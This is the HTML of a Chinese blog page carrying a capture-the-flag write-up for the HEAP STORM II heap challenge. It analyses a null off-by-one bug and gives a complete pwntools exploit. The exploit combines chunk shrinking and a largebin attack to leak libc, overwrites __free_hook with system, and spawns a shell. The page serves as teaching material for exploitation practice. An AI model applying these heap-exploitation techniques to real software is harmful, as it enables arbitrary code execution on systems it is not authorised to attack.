class="regexp">/ /</span>_<span class="regexp">/ /</span></span><br><span class="line"><span class="regexp">/_/</span> |_<span class="regexp">/_____/</span>_____<span class="regexp">/_/</span> |_<span class="regexp">/  /</span>_____<span class="regexp">/_/</span>  |_<span class="regexp">/_____/</span></span><br><span class="line"></span><br><span class="line">===== HEAP STORM II =====</span><br><span class="line"><span class="number">1.</span> Allocate</span><br><span class="line"><span class="number">2.</span> Update</span><br><span class="line"><span class="number">3.</span> Delete</span><br><span class="line"><span class="number">4.</span> View</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line"><span class="string">Command:</span></span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x7981;&#x7528;&#x4E86;fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;mmap&#x5728;0x13370000&#x5206;&#x914D;0x1000&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x7A7A;&#x95F4;</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap((void *)<span class="number">0x13370000</span>, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>LL)</span><br></pre></td></tr></table></figure>
<p>&#x5E76;&#x4E14;&#x4F1A;&#x5728;0x13370800&#x5F00;&#x59CB;&#x7684;0x20&#x4E2A;&#x5B57;&#x8282;&#x7A7A;&#x95F4;&#xFF0C;&#x586B;&#x5165;&#x751F;&#x6210;&#x7684;3&#x4E2A;&#x968F;&#x673A;&#x6570;&#xFF0C;RA&#x3001;RB&#x3001;RC&#xFF0C;&#x586B;&#x5145;&#x65B9;&#x5F0F;&#x5982;&#x56FE;&#x3002;&#x4E0B;&#x9762;&#x7684;&#x7A7A;&#x95F4;&#x5199;&#x5165;&#x5806;&#x6307;&#x9488;&#x3002;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x5DE6;&#x8FB9;&#x7684;&#x4E00;&#x5217;&#x7684;&#x5185;&#x5BB9;&#x4E3A;RA&#x5F02;&#x6216;0&#xFF0C;&#x53F3;&#x8FB9;&#x7684;&#x4E00;&#x5217;&#x5185;&#x5BB9;&#x4E3A;RB&#x5F02;&#x6216;0&#xFF0C;&#x6B64;&#x540E;&#x6BCF;&#x6B21;&#x5199;&#x5165;&#x7684;&#x5806;&#x6307;&#x9488;&#x90FD;&#x8981;&#x5148;&#x4E0E;RA&#x5F02;&#x6216;&#xFF0C;&#x5806;&#x5927;&#x5C0F;&#x90FD;&#x8981;&#x5148;&#x4E0E;RB&#x5F02;&#x6216;&#x3002;</p>
<p>Update&#x3001;Delete&#x524D;&#x90FD;&#x4F1A;&#x5148;&#x8BA1;&#x7B97;&#x6240;&#x8981;&#x64CD;&#x4F5C;&#x7684;&#x5806;&#x7684;&#x5927;&#x5C0F;&#x4E0E;RB&#x5F02;&#x6216;&#xFF0C;&#x5982;&#x679C;&#x7B49;&#x4E8E;0&#xFF0C;&#x5219;&#x8868;&#x793A;&#x8BE5;&#x4F4D;&#x7F6E;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x65B0;&#x7684;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<p>&#x4F7F;&#x7528;View&#x529F;&#x80FD;&#x7684;&#x6761;&#x4EF6;&#x662F;RC^RC&#x7684;&#x503C;&#x4E3A;0x13377331&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x5F00;&#x59CB;&#x662F;&#x6CA1;&#x6709;view&#x529F;&#x80FD;&#x7684;&#x3002;</p>
<p>Update&#x51FD;&#x6570;&#x5185;&#xFF0C;&#x5B58;&#x5728;null by off one&#xFF0C;&#x4F46;&#x662F;&#x6EA2;&#x51FA;&#x524D;&#x7684;12&#x4E2A;&#x5B57;&#x8282;&#x4E0D;&#x53D7;&#x63A7;&#x5236;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)v3 = <span class="number">0x524F545350414548</span>LL;         <span class="comment">// II_MROTSPAEH</span></span><br><span class="line">*(_DWORD *)(v3 + <span class="number">8</span>) = <span class="number">0x49495F4D</span>;</span><br><span class="line">*(_BYTE *)(v3 + <span class="number">12</span>) = <span class="number">0</span>;                      <span class="comment">// null off by one</span></span><br></pre></td></tr></table></figure>
<p>&#x6EA2;&#x51FA;&#x524D;&#x4F1A;&#x88AB;&#x586B;&#x5165;<code>II_MROTSPAEH</code>&#x6570;&#x636E;</p>
<p>Delete&#x4E0D;&#x5B58;&#x5728;UAF&#x3002;</p>
<h2 id="0x01&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x01&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x01&#x5229;&#x7528;&#x5206;&#x6790;"></a>0x01&#x5229;&#x7528;&#x5206;&#x6790;</h2><p>&#x56E0;&#x4E3A;&#x4E0D;&#x5B58;&#x5728;UAF&#xFF0C;&#x4E14;&#x53EA;&#x80FD;&#x6EA2;&#x51FA;&#x4E00;&#x4E2A;\x00&#xFF0C;&#x6CA1;&#x6709;View&#x529F;&#x80FD;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;chunk overlapping&#xFF0C;&#x7ED3;&#x5408;&#x4F7F;&#x7528;largebin attack&#xFF0C;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;&#x5206;&#x914D;&#x5230;0x13370800&#x9644;&#x8FD1;&#x7684;chunk&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x901A;&#x8FC7;update&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x83B7;&#x5F97;VIew&#x529F;&#x80FD;&#xFF0C;&#x6CC4;&#x9732;libc&#x3001;&#x4FEE;&#x6539;free_hook&#x7B49;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x6EA2;&#x51FA;\x00&#x524D;&#x7684;12&#x4E2A;&#x5B57;&#x8282;&#x4E0D;&#x53D7;&#x63A7;&#x5236;&#xFF0C;&#x6240;&#x4EE5;chunk overlapping&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x4FEE;&#x6539;prev_size&#x4F4D;&#x5B9E;&#x73B0;&#x7684;extend the chunk&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4FEE;&#x6539;size&#x4F4D;&#x5B9E;&#x73B0;&#x7684;shrink the chunk&#x3002;</p>
<h2 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./heapstorm2&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;libc.so.6&apos;</span>)</span><br><span class="line">context.log_level=<span class="string">&apos;debug&apos;</span></span><br><span class="line">context.terminal = [<span class="string">&apos;gnome-terminal&apos;</span>,<span class="string">&apos;-x&apos;</span>,<span class="string">&apos;bash&apos;</span>,<span class="string">&apos;-c&apos;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	raw_input(<span class="string">&apos;test&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Allocated&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Content: &apos;</span>)</span><br><span class="line">	p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Command&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Index&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Command&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Index&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="number">0x108</span>)<span class="comment">#0 chunkA</span></span><br><span class="line">	add(<span class="number">0x300</span>)<span class="comment">#1 chunkB</span></span><br><span class="line">	add(<span class="number">0x200</span>)<span class="comment">#2 chunkC</span></span><br><span class="line">	add(<span class="number">0x130</span>)<span class="comment">#3 ||</span></span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x108</span>)<span class="comment">#0 r 023</span></span><br><span class="line">	update(<span class="number">0</span>,<span class="number">0x108</span><span class="number">-12</span>,<span class="string">&apos;a&apos;</span>*(<span class="number">0x108</span><span class="number">-12</span>))<span class="comment">#chunkB 0x310=&gt;0x300</span></span><br><span class="line">	add(<span class="number">0x80</span>)<span class="comment">#1 chunkb1</span></span><br><span class="line">	add(<span class="number">0x260</span>)<span class="comment">#4 chunkb2 r 01234</span></span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	dele(<span class="number">2</span>)<span class="comment">#unsortedbin = 0x520  r 034</span></span><br><span class="line">	add(<span class="number">0x80</span>)<span class="comment">#1 remain 0134 </span></span><br><span class="line">	add(<span class="number">0x480</span>)<span class="comment">#2 4=&gt;2 remain 01234 </span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x108</span>)<span class="comment">#5 chunkA</span></span><br><span class="line">        add(<span class="number">0x300</span>)<span class="comment">#6 chunkB</span></span><br><span class="line">        add(<span class="number">0x200</span>)<span class="comment">#7 chunkC</span></span><br><span class="line">        add(<span class="number">0x130</span>)<span class="comment">#8 ||</span></span><br><span class="line">        dele(<span class="number">6</span>)</span><br><span class="line">        dele(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">0x108</span>)<span class="comment">#5 r 578</span></span><br><span class="line">        update(<span class="number">5</span>,<span class="number">0x108</span><span class="number">-12</span>,<span class="string">&apos;a&apos;</span>*(<span class="number">0x108</span><span class="number">-12</span>))<span class="comment">#chunkB 0x310=&gt;0x300</span></span><br><span class="line">        add(<span class="number">0x90</span>)<span class="comment">#6 chunkb1 5678</span></span><br><span class="line">        add(<span class="number">0x250</span>)<span class="comment">#9 chunkb2 r 56789</span></span><br><span class="line">        dele(<span class="number">6</span>)</span><br><span class="line">        dele(<span class="number">7</span>)<span class="comment">#unsortedbin = 0x520  r 589</span></span><br><span class="line">        add(<span class="number">0x90</span>)<span class="comment">#6 remain 5689</span></span><br><span class="line">        add(<span class="number">0x470</span>)<span class="comment">#7 9=&gt;7 remain 56789</span></span><br><span class="line"></span><br><span class="line">	dele(<span class="number">7</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	add(<span class="number">0x480</span>)<span class="comment">#2</span></span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#largebin attack	</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)+p64(<span class="number">0x13370800</span><span class="number">-0x20</span>)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">	update(<span class="number">4</span>,len(payload),payload)</span><br><span class="line">	payload = p64(<span class="number">0</span>)+p64(<span class="number">0x13370800</span><span class="number">-0x20</span>+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x13370800</span><span class="number">-0x20</span><span class="number">-0x18</span><span class="number">-5</span>)+p64(<span class="number">0</span>)</span><br><span class="line">	update(<span class="number">9</span>,len(payload),payload)</span><br><span class="line">	add(<span class="number">0x48</span>)<span class="comment">#2 #2 is on the 0x13370800-0x10</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#RA,RB = 0; RC = 0x13377331</span></span><br><span class="line">	<span class="comment">#ptr0 =&gt; ptr0</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x13370800</span>+<span class="number">0x20</span>)</span><br><span class="line">	update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#ptr1 =&gt; unsortedbin addr</span></span><br><span class="line">	payload = p64(<span class="number">0x13370800</span>+<span class="number">0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x13370800</span><span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">	update(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">	view(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Chunk[1]: &apos;</span>)</span><br><span class="line">	unsortedbin_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	log.info(<span class="string">&apos;unsortedbin_addr: &apos;</span>+hex(unsortedbin_addr))</span><br><span class="line">	</span><br><span class="line">	payload = p64(<span class="number">0x13370800</span>+<span class="number">0x20</span>)+p64(<span class="number">0x100</span>)+p64(unsortedbin_addr+<span class="number">0x10</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">	update(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">	view(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Chunk[1]: &apos;</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))<span class="number">-0x3C4B20</span><span class="number">-88</span></span><br><span class="line">        log.info(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line">	system = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	binsh = libc_base + libc.search(<span class="string">&apos;/bin/sh\x00&apos;</span>).next()</span><br><span class="line">	free_hook = libc_base + libc.symbols[<span class="string">&apos;__free_hook&apos;</span>]</span><br><span class="line"></span><br><span class="line">	payload = p64(<span class="number">0x13370800</span>+<span class="number">0x20</span>)+p64(<span class="number">0x100</span>)+p64(free_hook)+p64(<span class="number">0x100</span>)+p64(binsh)+p64(<span class="number">0x100</span>)</span><br><span class="line">	update(<span class="number">0</span>,len(payload),payload) </span><br><span class="line">	update(<span class="number">1</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/IMG.jpg" alt="Po1lux">
            
              <p class="site-author-name" itemprop="name">Po1lux</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">56</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">28</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://xn--74q78i15hxv3arigm4e.cn" title="嘉神川克罗艾" target="_blank">嘉神川克罗艾</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Po1lux</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: '18YVWKzBgzb7zbj1Fmt6ipCC-gzGzoHsz',
        appKey: 'mPl8Laz5VD56ciWT9PwYKa8n',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("18YVWKzBgzb7zbj1Fmt6ipCC-gzGzoHsz", "mPl8Laz5VD56ciWT9PwYKa8n");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
